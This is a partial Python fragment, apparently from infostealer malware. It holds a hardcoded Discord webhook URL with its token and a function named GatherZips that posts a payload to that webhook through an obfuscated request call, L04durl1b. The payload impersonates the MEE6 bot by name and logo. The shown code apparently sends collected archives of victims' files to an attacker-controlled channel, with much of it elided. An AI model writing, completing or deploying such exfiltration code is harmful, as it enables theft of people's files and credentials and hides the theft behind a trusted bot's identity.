...
wh00k = "https://discord.com/api/webhooks/1190511119253651537/9LHvgroxchruTvEedBKbmq87pvuGJTfbTc7m5AYQgq5084qxNMKY-MCIZ7qgKRT-Zolu"
...
def GatherZips(paths1, paths2, paths3):
    ...
    data = {
        ...
        "embeds": [
            ...
            "footer": {
                "text": "MEE6",
                "icon_url": "https://www.streamscheme.com/wp-content/uploads/2021/04/mee6-logo.jpg"
            }
            }
        ],
        "username": "MEE6",
        "avatar_url": "https://www.streamscheme.com/wp-content/uploads/2021/04/mee6-logo.jpg",
        "attachments": []
    }
    L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
